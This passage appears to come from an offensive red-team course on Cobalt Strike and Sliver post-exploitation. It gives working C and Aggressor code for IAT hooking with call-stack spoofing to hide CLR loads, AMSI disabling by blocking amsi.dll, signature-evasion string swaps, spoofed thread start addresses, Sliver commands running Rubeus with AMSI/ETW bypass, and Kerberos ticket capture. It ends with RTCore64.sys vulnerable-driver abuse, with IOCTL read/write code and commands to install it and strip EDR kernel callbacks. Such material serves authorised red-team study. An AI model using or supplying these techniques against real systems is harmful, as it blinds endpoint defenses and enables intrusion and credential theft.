[10/21 12:31:46] [+] job 1 completed

5.7 BOF APIs

The examples above use a mix of Beacon's BOF APIs and direct Win32/Nt calls. The point is to demonstrate that the kit doesn't constrain technique choice — you can implement any novel injection method.

Beacon exposes useful internal helpers that make sensible fallbacks:

APIPurpose
BeaconSpawnTemporaryProcessSpawn a process for fork & run, with token impersonation support
BeaconInjectProcessUse Beacon's Malleable C2 injection techniques against a given PID
BeaconInjectTemporaryProcessSpawn-then-inject via the Malleable C2 techniques

Calling BeaconInjectProcess as a fallback is useful when your custom technique fails or isn't compatible with the current injection (e.g. cross-architecture).

5.8 Cleanup?

The postex DLL is responsible for terminating itself via ExitThread or ExitProcess. The injection BOF only needs to clean up resources it allocated for the injection — close the process and thread handles, unmap any local section views, close the section handle. Once execution transfers, the BOF's job is done.

5.9 Postex Loader

Just like Beacon, postex DLLs accept a custom loader that handles the bootstrap. This covers the built-ins (execute-assembly, mimikatz, powerpick) and any custom postex DLL built with the postex kit. We can reuse our Crystal Palace Beacon loader with two changes:

The entry point must accept a pointer to user-supplied arguments that get forwarded to the postex DLL:

void go ( void * loader_arguments )

The postex DLL entry point is called twice. First with DLL_PROCESS_ATTACH and the DLL's own base address (standard module init). Then again with reason code 0x4, passing the loader's base address (so the postex DLL can free the loader if post-ex.cleanup is enabled) and the arguments buffer:

entry_point ( ( HINSTANCE ) dll_dst, DLL_PROCESS_ATTACH, NULL );
entry_point ( ( HINSTANCE ) ( char * ) go, 0x4, loader_arguments );

5.10 POSTEX_RDLL_GENERATE

The POSTEX_RDLL_GENERATE Aggressor hook fires when a compatible postex DLL is about to run. The logic mirrors BEACON_RDLL_GENERATE from earlier — load the loader spec, link the postex DLL, return the bundled bytes:

set POSTEX_RDLL_GENERATE
{ 
    local ( '$postex $arch $spec_path $spec $final' );
   
    $postex = $2;
    $arch   = $3;

    if ( $arch eq "x86" )
    {
        warn ( "Crystal Kit is x64 only" );
        return $null;
    }

    $spec_path = getFileProper ( script_resource ( "postex" ), "loader.spec" );
    $spec      = [ LinkSpec Parse: $spec_path ];
    $final     = [ $spec run: $postex, [ new HashMap ] ];

    if ( strlen ( $final ) == 0 )
    {
       warn ( "Failed to build package" );
       return $null;
    }

    return $final;
}
beacon> powerpick $pid
[*] Tasked beacon to run: $pid (unmanaged)
[+] host called home, sent: 157637 bytes
[+] job registered with id 1
[+] [job 1] received output:
19344

[+] job 1 completed

5.11 Memory cleanup

Explicit fork & run commands like psinject inject the postex DLL into an existing process and use ExitThread rather than ExitProcess, so the DLL stays in memory after the job completes. The same timer-queue cleanup pattern used for Beacon in section 4.4 applies here unchanged — capture a context, build VirtualFree calls for the postex DLL and the loader, fire on NtContinue via a delayed timer.

5.12 Postex Image Loads

The postex DLLs for powerpick, psinject, and execute-assembly need the .NET Common Language Runtime. They load it by calling LoadLibraryW("mscoree.dll") and then CLRCreateInstance. Under the hood that triggers a cascade:

  1. mscoree.dll calls LoadLibraryExW to load a versioned mscoreei.dll (e.g. C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll).
  2. mscoreei.dll calls LoadLibraryExW to load the matching clr.dll.

Because the call originates from the injected postex DLL, the resulting image-load event looks like the CLR is being loaded from unbacked memory — a common indicator for .NET-based post-exploitation:

C:\Windows\System32\ntdll.dll!NtMapViewOfSection+0x14
C:\Windows\System32\ntdll.dll!LdrGetDllHandleByMapping+0xb8a
C:\Windows\System32\ntdll.dll!LdrGetDllHandleByMapping+0x6be
C:\Windows\System32\ntdll.dll!RtlInsertElementGenericTableFullAvl+0x3ec
C:\Windows\System32\ntdll.dll!RtlEqualUnicodeString+0x100d
C:\Windows\System32\ntdll.dll!TpCallbackMayRunLong+0x264
C:\Windows\System32\ntdll.dll!LdrGetDllHandleEx+0xd10
C:\Windows\System32\ntdll.dll!LdrGetDllHandleEx+0x990
C:\Windows\System32\ntdll.dll!LdrLoadDll+0x170
C:\Windows\System32\KernelBase.dll!LoadLibraryExW+0xe6
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll!CreateInterface+0x2080
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll!CreateInterface+0x24f2
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll!CreateInterface+0x25e3
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll!CreateInterface+0x1c0b
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll!CreateInterface+0x1cca
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll!CreateInterface+0x3fda
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll!CreateInterface+0x4694
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll!CreateInterface+0x4857
Unbacked+0x2444

5.13 More hooking

The fix is to hook LoadLibraryW in the postex DLL itself to catch the mscoree.dll load — but we have no hooks inside mscoree.dll/mscoreei.dll because our loader isn't loading those. The workaround: let Windows load the DLL normally, then walk the IAT of the just-loaded module and rewrite its LoadLibraryExW import to point at our hook. Subsequent loads from inside mscoree.dll then come through our spoofing proxy.

First, add a _LoadLibraryExW wrapper that simply pipes through spoof_call:

DECLSPEC_IMPORT HMODULE   WINAPI KERNEL32$LoadLibraryW   ( LPCWSTR );
DECLSPEC_IMPORT HMODULE   WINAPI KERNEL32$LoadLibraryExW ( LPCWSTR, HANDLE, DWORD );
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );

HMODULE WINAPI _LoadLibraryExW ( LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$LoadLibraryExW );
    call.argc = 3;

    call.args [ 0 ] = spoof_arg ( lpLibFileName );
    call.args [ 1 ] = spoof_arg ( hFile );
    call.args [ 2 ] = spoof_arg ( dwFlags );

    return ( HMODULE ) spoof_call ( &call );
}

HMODULE WINAPI _LoadLibraryW ( LPCWSTR lpLibFileName )
{
    /* load the module */
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$LoadLibraryW );
    call.argc = 1;
    
    call.args [ 0 ] = spoof_arg ( lpLibFileName );

    /* hold the result */
    HMODULE module = ( HMODULE ) spoof_call ( &call );

    /* was this mscoree.dll? */
    if ( MSVCRT$_wcsicmp ( lpLibFileName, L"mscoree.dll" ) == 0 )
    {
        /* parse the module's headers */
        IMAGE_DOS_HEADER * dos_header = ( IMAGE_DOS_HEADER * ) ( module );
        IMAGE_NT_HEADERS * nt_headers = ( IMAGE_NT_HEADERS * ) ( ( DWORD_PTR ) module + dos_header->e_lfanew );

        /* get the import directory */
        IMAGE_DATA_DIRECTORY imports_directory      = nt_headers->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
        IMAGE_IMPORT_DESCRIPTOR * import_descriptor = ( IMAGE_IMPORT_DESCRIPTOR * ) ( imports_directory.VirtualAddress + ( DWORD_PTR ) module );

        /* walk every imported module */
        while ( import_descriptor->Name != 0 )
        {
            IMAGE_THUNK_DATA * original_first_thunk = ( IMAGE_THUNK_DATA * ) ( ( DWORD_PTR ) module + import_descriptor->OriginalFirstThunk );
            IMAGE_THUNK_DATA * first_thunk          = ( IMAGE_THUNK_DATA * ) ( ( DWORD_PTR ) module + import_descriptor->FirstThunk );

            /* walk every imported function */
            while ( original_first_thunk->u1.AddressOfData != 0 )
            {
                IMAGE_IMPORT_BY_NAME * func_name = ( IMAGE_IMPORT_BY_NAME * ) ( ( DWORD_PTR ) module + original_first_thunk->u1.AddressOfData );
                DWORD func_hash = ror13hash ( ( char * ) ( func_name->Name ) );

                /* is the imported function LoadLibraryExW? */
                if ( func_hash == LOADLIBRARYEXW_HASH )
                {
                    /* yep, hook it */
                    DWORD old_protect = 0;

                    if ( KERNEL32$VirtualProtect ( ( LPVOID ) ( &first_thunk->u1.Function ), sizeof ( PVOID ), PAGE_READWRITE, &old_protect ) )
                    {
                        first_thunk->u1.Function = ( DWORD_PTR ) ( _LoadLibraryExW );
                        KERNEL32$VirtualProtect ( ( LPVOID ) ( &first_thunk->u1.Function ), sizeof ( PVOID ), old_protect, &old_protect );
                    }
                }

                ++original_first_thunk;
                ++first_thunk;
            }

            import_descriptor++;
        }
    }

    /* now return the module */
    return module;
}

The above only catches the mscoree.dll → mscoreei.dll hop. We need the same treatment for mscoreei.dll → clr.dll, otherwise the CLR image load still appears unbacked. Repeat the IAT-walk logic in _LoadLibraryExW. The only quirk: mscoree.dll is loaded by short name, but mscoreei.dll arrives as an absolute path — so we extract the trailing filename before comparing:

DECLSPEC_IMPORT HMODULE   WINAPI KERNEL32$LoadLibraryW   ( LPCWSTR );
DECLSPEC_IMPORT HMODULE   WINAPI KERNEL32$LoadLibraryExW ( LPCWSTR, HANDLE, DWORD );
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );
DECLSPEC_IMPORT int       WINAPI MSVCRT$_wcsicmp         ( const wchar_t *, const wchar_t * );
DECLSPEC_IMPORT wchar_t * WINAPI MSVCRT$wcsrchr          ( const wchar_t *, wchar_t );

HMODULE WINAPI _LoadLibraryExW ( LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags )
{
    /* get the filename from path */
    LPCWSTR back = MSVCRT$wcsrchr ( lpLibFileName, L'\\' );
    LPCWSTR fwd  = MSVCRT$wcsrchr ( lpLibFileName, L'/' );
    LPCWSTR name = back > fwd ? back : fwd;

    if ( name ) {
        name++;
    }
    else {
        name = lpLibFileName;
    }

    /* load the module */
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$LoadLibraryExW );
    call.argc = 3;

    call.args [ 0 ] = spoof_arg ( lpLibFileName );
    call.args [ 1 ] = spoof_arg ( hFile );
    call.args [ 2 ] = spoof_arg ( dwFlags );

    /* hold the result */
    HMODULE module = ( HMODULE ) spoof_call ( &call );

    /* check to see if it's mscoreei.dll */
    if ( MSVCRT$_wcsicmp ( name, L"mscoreei.dll") == 0 )
    {
        /* parse the module's headers */
        IMAGE_DOS_HEADER * dos_headers = ( IMAGE_DOS_HEADER * ) module;
        IMAGE_NT_HEADERS * nt_headers  = ( IMAGE_NT_HEADERS * ) ( ( DWORD_PTR ) module + dos_headers->e_lfanew );

        /* get the import directory */
        IMAGE_DATA_DIRECTORY imports_directory      = nt_headers->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
        IMAGE_IMPORT_DESCRIPTOR * import_descriptor = ( IMAGE_IMPORT_DESCRIPTOR * ) ( imports_directory.VirtualAddress + ( DWORD_PTR ) module );

        /* walk every imported module */
        while ( import_descriptor->Name != 0 )
        {
            IMAGE_THUNK_DATA * original_first_thunk = ( IMAGE_THUNK_DATA * ) ( ( DWORD_PTR ) module + import_descriptor->OriginalFirstThunk );
            IMAGE_THUNK_DATA * first_thunk          = ( IMAGE_THUNK_DATA * ) ( ( DWORD_PTR ) module + import_descriptor->FirstThunk );

            /* walk every imported function */
            while ( original_first_thunk->u1.AddressOfData != 0 )
            {
                IMAGE_IMPORT_BY_NAME * func_name = ( IMAGE_IMPORT_BY_NAME * ) ( ( DWORD_PTR ) module + original_first_thunk->u1.AddressOfData );
                DWORD func_hash = ror13hash ( ( char * ) ( func_name->Name ) );
                
                /* is the imported function LoadLibraryExW? */
                if ( func_hash == LOADLIBRARYEXW_HASH )
                {
                    /* yep, hook it */
                    DWORD old_protect = 0;

                    if ( KERNEL32$VirtualProtect ( ( LPVOID ) ( &first_thunk->u1.Function ), sizeof ( PVOID ), PAGE_READWRITE, &old_protect ) )
                    {
                        first_thunk->u1.Function = ( DWORD_PTR ) ( _LoadLibraryExW );
                        KERNEL32$VirtualProtect ( ( LPVOID ) ( &first_thunk->u1.Function ), sizeof ( PVOID ), old_protect, &old_protect);
                    }
                }

                ++original_first_thunk;
                ++first_thunk;
            }

            import_descriptor++;
        }
    }

    /* now return the module */
    return module;
}

5.14 AMSI

Malleable C2's post-ex.amsi_disable option patches AmsiScanBuffer in memory to return a false-negative result. This matters for powerpick, psinject, and execute-assembly, which all run PowerShell or .NET code that's instrumented by AMSI. But that option is implemented in the default postex loader — we don't get it with a custom loader, so we have to add it ourselves.

There are multiple ways to neutralize AMSI: patch AmsiScanBuffer in memory, use hardware breakpoints, or block the DLL from loading in the first place. Which one to pick depends on what the EDR is signaturing. We'll use the load-blocking approach because it slots cleanly into the IAT hooking from the previous section.

clr.dll calls LoadLibraryExW to load amsi.dll before scanning anything. Since we already hook LoadLibraryExW in mscoreei.dll, we extend the same hook into clr.dll. The IAT-walk check just needs to accept either name:

/* check to see if it's mscoreei.dll or clr.dll */
if ( MSVCRT$_wcsicmp ( name, L"mscoreei.dll") == 0 || MSVCRT$_wcsicmp ( name, L"clr.dll") == 0  )
{
    ...
}

Then add an early-return inside _LoadLibraryExW — if the caller is asking for amsi.dll, return NULL and let the CLR continue without it. The CLR doesn't crash on a failed AMSI load; it just silently skips scanning:

if ( MSVCRT$_wcsicmp ( name, L"amsi.dll" ) == 0 ) {
    /* return without loading (─ ‿ ─) */
    return NULL;
}

Sliver equivalent: Sliver's execute-assembly patches AMSI and ETW directly inside the spawned host process. The --amsi-bypass and --etw-bypass flags are the defaults you want for any .NET execution:

# Patch AmsiScanBuffer and ETW EtwEventWrite before assembly runs
sliver (SESSION) > execute-assembly --amsi-bypass --etw-bypass \
                   --process notepad.exe --ppid-fallback explorer.exe \
                   /opt/dotnet/Rubeus.exe triage

# Or run in-process to skip the sacrificial spawn altogether
sliver (SESSION) > execute-assembly --in-process --amsi-bypass --etw-bypass \
                   /opt/dotnet/Seatbelt.exe -group=remote

These flags use the same patch-AmsiScanBuffer approach as CS. For the load-blocking variant (intercept LoadLibraryExW and refuse amsi.dll), you'd write a BOF and load it before execute-assembly — community implementations like BOF.NET include an "AMSI patchless" mode using hardware breakpoints.

5.15 Postex Kit

The postex kit lets operators write their own postex DLLs that integrate with Beacon's job architecture. Use a postex DLL when the work needs to run in the background or when the implementation is too complex for a BOF.

The kit is a Visual Studio solution with a base project (debugging and mocking helpers) and an example postex project that builds to an executable in debug mode (for VS debugger use) and a DLL in release mode. The DLL is then run via beacon_execute_postex_job.

Unlike BOFs, postex DLLs have full access to the C runtime and don't require dynamic function resolution — you write your code in PostexMain and ship it.

Sliver equivalent: Sliver's analogue is extensions — reflective DLLs with a JSON manifest that the implant can load on demand. They have full Win32 / C runtime access (same as postex DLLs) and persist for the implant's lifetime rather than fire-and-forget.

# Install an extension from the armory
sliver > armory install rubeus

# Or load a local extension (DLL + manifest)
sliver (SESSION) > extensions load /opt/ext/my-postex/

# Once loaded, the extension exposes a new command
sliver (SESSION) > my-postex --target lon-dc-1

5.16 execute-dll

The simplest way to run a postex DLL is the built-in execute-dll command, which forwards typed arguments verbatim to the DLL via the USER_ARGUMENT_INFO structure:

beacon> help execute-dll
Use: execute-dll [pid] [/path/to/postex.dll] [args]
     execute-dll [/path/to/postex.dll] [args]

The DLL reads the arguments from postexData->UserArgumentInfo.Buffer:

void PostexMain ( PPOSTEX_DATA postexData )
{
    RETURN_ON_NULL ( postexData );
	BeaconPrintf ( CALLBACK_OUTPUT, "You said: %s", postexData->UserArgumentInfo.Buffer );
}
beacon> execute-dll C:\Tools\arsenal-kit\kits\postex\x64\Release\postex.dll Hello World
[*] Tasked beacon to execute a User-Defined Postex Task
[+] host called home, sent: 135499 bytes
[+] job registered with id 1
[+] [job 1] received output:
You said: Hello World
[+] job 1 completed

execute-dll is fine when the DLL takes one (or zero) arguments. For multiple arguments use bof_pack via a custom alias:

void PostexMain ( PPOSTEX_DATA postexData )
{
    RETURN_ON_NULL ( postexData );

    datap parser;
    char* name;
    int   age;

    BeaconDataParse ( &parser, postexData->UserArgumentInfo.Buffer, postexData->UserArgumentInfo.Size );

    name = BeaconDataExtract ( &parser, NULL );
    age  = BeaconDataInt ( &parser );

    BeaconPrintf ( CALLBACK_OUTPUT, "Your name is %s and you are %d years old", name, age );
}

5.17 beacon_execute_postex_job

The Aggressor alias reads the DLL from disk, packs the args, and dispatches via beacon_execute_postex_job:

alias postex-demo
{
    local( '$bid $name $age $dll_path $dll_handle $dll $args' );

    $bid  = $1;

    # args are passed in the order they're typed
    $name = $2;
    $age  = $3;

    # get the correct path to the DLL
    if( -is64 $bid ) {
        $dll_path = getFileProper ( script_resource ( ), "x64", "Release", "postex.dll" );
    } else {
        $dll_path = getFileProper ( script_resource ( ), "Release", "postex.dll" );
    }

    if ( ! -isFile $dll_path )
    {
        berror ( $1, "Cannot find $dll_path" );
        return;
    }

    # read dll from disk
    $dll_handle = openf ( $dll_path );
    $dll        = readb ( $dll_handle, -1 );

    closef ( $dll_handle );

    # pack the arguments
    $args = bof_pack ( $bid, "zi", $2, $3 );

    # go
    beacon_execute_postex_job ( $bid, $null, $dll, $args, $null );
}
beacon> postex-demo rasta 99
[*] Tasked beacon to execute a User-Defined Postex Task
[+] host called home, sent: 135502 bytes
[+] job registered with id 2
[+] [job 2] received output:
Your name is rasta and you are 99 years old
[+] job 2 completed

5.18 Callback functions

beacon_execute_postex_job accepts a callback lambda where you can intercept and transform output:

$callback = lambda ( {
	...
} );

beacon_execute_postex_job ( $bid, $null, $dll, $null, $callback );

The lambda receives the Beacon ID, the output (whatever was sent via BeaconPrintf/BeaconOutput), and a metadata dictionary:

$callback = lambda ( {
    local ( '$bid $output %info' );
    this ( '$jid' );

    # get arguments passed to lambda
    ( $bid, $output, %info ) = @_;
} );

The dictionary has five keys:

5.18.1 type

The reason for the callback. Possible values:

ValueMeaning
job_registeredBeacon acknowledged the job.
outputBeaconPrintf/BeaconOutput emitted output with type CALLBACK_OUTPUT.
errorEmitted with CALLBACK_ERROR.
job_completedPostex DLL finished.

5.18.2 type_id

The raw output type passed to BeaconPrintf/BeaconOutput — CALLBACK_OUTPUT, CALLBACK_OUTPUT_OEM, CALLBACK_OUTPUT_UTF8, etc. Defined in beacon.h.

5.18.3 jid

The Cobalt Strike job ID.

5.18.4 chunk_num

Order index for this chunk, in case total output exceeded Beacon's max packet size. The developer is responsible for reassembling chunks.

5.18.5 is_final

Whether this is the final chunk.

A typical dispatch table on type — print output and errors using bjoblog/bjoberror; null out state on completion:

$callback = lambda ( {
    local ( '$bid $data $result %info $type $parsed' );
    this ( '$jid' );

    # get arguments passed to lambda
    ( $bid, $result, %info ) = @_;

    # get type and jid
    $type = %info [ 'type' ];
    $jid  = %info [ 'jid' ];

    # do something based on type
    if ( $type eq 'job_registered' ) {
        # do nothing
    }
    else if ( $type eq 'output' )
    {
        # print output to console
        bjoblog ( $bid, $jid, $result );
    } else if ( $type eq 'error' )
    {
        # print error to console
        bjoberror ( $bid, $jid, $result );
    }
    else if ( $type eq 'job_completed' )
    {
        # null out the jid
        $jid = $null;
    }
} );

You can also do richer processing. For example, a TGT-dump postex DLL formats each finding as client:realm:ticket on the DLL side:

BeaconPrintf ( CALLBACK_OUTPUT, "%s:%s:%s", client, realm, ticket );

And the callback parses each line and pushes it into the credential model instead of printing it:

if ( $type eq 'output' )
{
    # parse output
    $parsed = matches ( $result, '(.*):(.*):(.*)' );

    # add to credential model
    credential_add ( $parsed [ 0 ], $parsed [ 2 ], $parsed [ 1 ], "Kerberos", binfo ( $bid ) [ "computer" ] );

    # output something on the console
    bjoblog ( $bid, $jid, "Captured TGT for " . $parsed [ 1 ] . "\\" . $parsed [ 0 ] );
}

5.19 Bidirectional comms

Callbacks can send data back to the running postex DLL with bjob_send_data:

bjob_send_data ( $bid, $jid, $data );

The DLL needs to poll for inbound data on the named pipe via BeaconInputAvailable / BeaconInputRead:

while ( TRUE )
{
    /* is there data on the pipe? */
    DWORD bytesAvailable = BeaconInputAvailable ( );

    if ( bytesAvailable > 0 )
    {
        /* somewhere to hold the data */
        char* pipeData = new char [ bytesAvailable ] ( );

        /* read the data */
        BeaconInputRead ( pipeData, bytesAvailable );

        /* do something */

        /* cleanup the data */
        delete [ ] pipeData;
    }

    /* sleep for a bit */
    Sleep ( 60 * 1000 );
}

5.19.1 Breaking from infinite loops

Beacon's jobkill command doesn't forcefully terminate a postex job — it just instructs Beacon to disconnect from the named pipe. A DLL using an infinite loop has to detect that disconnect itself, otherwise it never stops running.

The pipe handle is stored globally as gPipeHandle. A simple PeekNamedPipe check on it returns ERROR_BROKEN_PIPE when Beacon closes the connection:

BOOL ClientConnected ( ) {
    if ( ! PeekNamedPipe ( gPipeHandle, NULL, 0, NULL, NULL, 0 ) ) {
        if ( GetLastError ( ) == ERROR_BROKEN_PIPE ) {
            return FALSE;
        }
    }
    return TRUE;
}

Call it from the loop body and break out when the client disconnects:

while ( TRUE )
{
    ...

    /* sleep for a bit */
    Sleep ( 60 * 1000 );

    /* are we still connected? */
    if ( ! ClientConnected ( ) ) {
        break;
    }
}

When PostexMain returns, the postex kit's boilerplate calls either ExitThread (explicit injection) or ExitProcess (spawn injection) based on what was patched in at job start.

5.20 Quickfire OPSEC

A series of OPSEC failures common to fork & run commands, and the mitigations.

5.21 Processes with unusual arguments

EDRs alert on image-load events for clr.dll and System.Management.Automation.dll loading into atypical processes. The fix is to pick a spawnto process that legitimately loads them — MSBuild.exe, ngen.exe, ngentask.exe, msiexec.exe, etc.

The follow-on problem is that these binaries are usually executed with command-line arguments, so spawning them without any arguments is itself suspicious. Cobalt Strike uses CreateProcessA with the spawnto config passed as lpCommandLine — which means you can supply arguments directly in the config. So instead of:

spawnto x64 %windir%\sysnative\msiexec.exe

Add representative arguments:

spawnto x64 %windir%\sysnative\msiexec.exe /i foo.msi /quiet

5.22 Suspicious remote memory allocations

Allocating RWX memory during remote injection — even from a spoofed call stack — is consistently flagged. Use process-inject.startrwx and process-inject.userwx in Malleable C2 to control initial and execution permissions, or implement an injection method in the process inject kit that avoids RWX entirely.

5.23 Thread start addresses

Most injection methods create a thread via CreateRemoteThread or RtlCreateUserThread with a StartAddress pointing at the shellcode. If the shellcode lives in freshly-allocated memory, the start address won't match any loaded module, and EDR thread-creation monitors will flag it.

The standard workaround is to create the thread suspended with a legitimate start address in a loaded DLL (so that's what gets logged), then rewrite the start address to the shellcode and resume. The CreateThread, CreateRemoteThread, and ObfSetThreadContext options in process-inject.execute all support this with module!function+0x## syntax:

process-inject {
    set startrwx "false";
    set userwx "false";

    execute {
        ObfSetThreadContext "ntdll.dll!RtlUserThreadStart+0x2c";
        CreateRemoteThread  "ntdll.dll!TppWorkerThread+0x37e";
    }
}

5.24 Postex signatures

The default postex DLLs ship with strings that are well-signatured — format strings, error templates, default DLL names:

"Failed to invoke GetOutput w/hr 0x%08lx"
"Failed to get default AppDomain w/hr 0x%08lx"
"ICLRMetaHost::GetRuntime (v4.0.30319) failed w/hr 0x%08lx"
"RuntimeClrHost::GetCurrentAppDomainId failed w/hr 0x%08lx"
"ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx"

"[-] Failed to get default AppDomain w/hr 0x%08lx"
"[-] Failed to load the assembly w/hr 0x%08lx"
"[-] Failed to create the runtime host"
"[-] Invoke_3 on EntryPoint failed."
"[-] CLR failed to start w/hr 0x%08lx"
"[-] No .NET runtime found. :("
"[-] ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx"
".NET runtime [ver %S] cannot be loaded"

"ReflectiveLoader"
"powershell.x64.dll"
"invokeassembly.x64.dll"

Normally post-ex.transform.strrep and post-ex.transform.strrepex in Malleable C2 would handle these, but those transforms aren't applied when you use a custom loader. We have to do it manually in the POSTEX_RDLL_GENERATE hook using the strrep_pad helper from the load-time evasion chapter. Replacements must be equal or shorter length than the original:

set POSTEX_RDLL_GENERATE
{
    local ( '$postex $arch $spec_path $spec $final' );
   
    $postex = $2;
    $arch   = $3;

    # replace some common strings
    $postex = strrep_pad ( $postex, "w/hr", "err" );
    $postex = strrep_pad ( $postex, "[-]", "[!]" );
    $postex = strrep_pad ( $postex, "ReflectiveLoader", "legitLoader" );
    $postex = strrep_pad ( $postex, "invokeassembly.x64.dll", "revokeassembly.x64.dll" );
    $postex = strrep_pad ( $postex, "powershell.x64.dll", "weakshell.x64.dll" );

    # get path to spec file
    $spec_path = getFileProper ( script_resource ( "postex" ), "loader.spec" );

    ...

    return $final;
}

5.25 Tool signatures

In-memory postex tools (PowerView, SharpUp, Rubeus, etc.) are also signatured on hardcoded strings — especially comments in PowerShell scripts. Most of these can be stripped with find & replace in VSCode or Visual Studio.

.NET tools have an additional artefact: the typelib GUID, used for COM registrations. It's randomly generated when the project is created and persists in AssemblyInfo.cs:

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("658c8b7f-3664-4a95-9572-a3e5871dfc06")]

Generate a new GUID, replace the existing one, and rebuild:

PS C:\> [Guid]::NewGuid()

Guid
----
8ab6880f-1f83-4d40-a331-3d4164d25eb1

6. Kernel-Mode Bypasses

Why this matters: Everything we've done so far — unhooking ntdll, spoofing call stacks, encrypting Beacon in memory — operates in user mode. But EDRs also collect telemetry from the kernel, where our user-mode evasions have no effect. The kernel is the operating system's core — it manages processes, memory, and hardware. Code running in the kernel has unrestricted access to everything on the system.

EDRs register kernel callbacks — functions the kernel calls automatically whenever something interesting happens (a new process starts, a DLL loads, a registry key is modified, a handle is opened). These callbacks feed the EDR's detection engine from a vantage point that user-mode malware cannot tamper with — unless we find a way into the kernel ourselves.

EDRs also use ETW-TI (Event Tracing for Windows — Threat Intelligence), a special ETW provider that only the kernel can write to and only PPL-protected processes can consume. It reports events like process injection, suspicious image loads, and memory permission changes directly from the kernel.

To disable these kernel-resident protections, we need to write to kernel memory — which can only be done from a kernel-mode driver. Writing our own driver isn't viable because of Driver Signature Enforcement (DSE), which requires all kernel drivers to be signed by a trusted certificate authority.

The realistic option is to abuse a legitimate, signed driver that happens to be vulnerable — one that exposes IOCTLs (I/O Control codes — a way for user-mode programs to send commands to kernel drivers) that allow arbitrary kernel memory read/write. Hardware vendors sometimes ship drivers with these dangerous capabilities for diagnostics or overclocking. LOLDrivers catalogues known vulnerable drivers. You can check if one is already installed on the target, or install one yourself (local admin required).

The attack chain is: load vulnerable driver → use its read/write IOCTLs to find and patch kernel structures → disable EDR callbacks and ETW-TI → operate freely.

6.1 RTCore64

RTCore64.sys ships with MSI Afterburner (GPU overclocking software). It was designed so the overclocking app could read/write hardware registers, but the IOCTLs it exposes are not restricted to hardware addresses — they allow reading and writing any kernel memory address. This gives us two primitives that are enough to disable most kernel-resident protections: read any kernel address (to find structures) and write any kernel address (to patch them).

To talk to the driver, we use DeviceIoControl — a Windows API that sends a command (identified by an IOCTL code) and a data buffer to a kernel driver, and gets a response back. Think of it as "send a message to the driver and get an answer." The request payload uses a fixed structure with padding around the address, write size, and value:

struct RTCORE64_MEMORY {
	BYTE    Pad0 [ 8 ];
	DWORD64 Address;
	BYTE    Pad1 [ 8 ];
	DWORD   WriteSize;
	DWORD   Value;
	BYTE    Pad3 [ 16 ];
};

Reading takes an address and length; the result lands in memoryRead.Value:

RTCORE64_MEMORY memoryRead;
memset ( &memoryRead, 0, sizeof ( RTCORE64_MEMORY ) );

memoryRead.Address  = address;	// the address to read from
memoryRead.ReadSize = size;		// the length of data to read

DWORD bytesReturned = 0;

DeviceIoControl(
    hDriver,
    RTCORE64_MEMORY_READ_IOCTL,
    &memoryRead,
    sizeof ( memoryRead ),
    &memoryRead,
    sizeof ( memoryRead ),
    &bytesReturned,
    NULL);

Writing adds the value to write:

RTCORE64_MEMORY memoryWrite;
memset ( &memoryWrite, 0, sizeof ( RTCORE64_MEMORY ) );

memoryWrite.Address   = address;  // the address to write to
memoryWrite.WriteSize = size;     // the length of data
memoryWrite.Value     = value;    // the data itself

DWORD bytesReturned;

DeviceIoControl(
    hDriver,
    RTCORE64_MEMORY_WRITE_IOCTL,
    &memoryWrite,
    sizeof ( memoryWrite ),
    &memoryWrite,
    sizeof ( memoryWrite ),
    &bytesReturned,
    NULL);

Other vulnerable drivers have their own IOCTL codes, data formats, quirks, and limitations — you have to talk to each one the way it expects.

6.2 Driver BOFs

I've packaged kernel abuses as BOFs under the "Kernel Tradecraft" command group. Load the RTCore driver first, then use the BOFs:

beacon> help

Kernel Tradecraft
=================
Kernel tradecraft via RTCore64.sys. These commands expect the driver to already be loaded.

    disable_etwti              Disable ETW-TI
    list_callbacks             List Kernel callbacks
    remove_callback            Remove a Kernel callback

To install the driver, drop it into System32\drivers and register it as a kernel-mode service:

beacon> cd C:\Windows\System32\drivers
beacon> upload C:\Tools\driver-bofs\drivers\RTCore64.sys

beacon> run sc create RTCore64 type= kernel binPath= C:\Windows\System32\drivers\RTCore64.sys start= demand
[SC] CreateService SUCCESS

beacon> run sc start RTCore64
SERVICE_NAME: RTCore64
        TYPE               : 1  KERNEL_DRIVER
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 0
        FLAGS              :

6.2.1 Suspicious ntoskrnl image loads

Most kernel tradecraft needs the addresses of structures inside the kernel image — callback lists, ETW provider tables, etc. The standard approach is to load ntoskrnl.exe into the current process, scan it for a known instruction pattern, extract the relative offset, and add it to the kernel's base address to get the real kernel-memory location.

The registry-callback removal does exactly that:

  1. Call LoadLibraryExA to map ntoskrnl.exe into the process.
  2. Resolve CmUnRegisterCallback via GetProcAddress.
  3. Disassemble it looking for lea rcx,[nt!CallbackListHead].
  4. Extract the RVA from the lea operand.

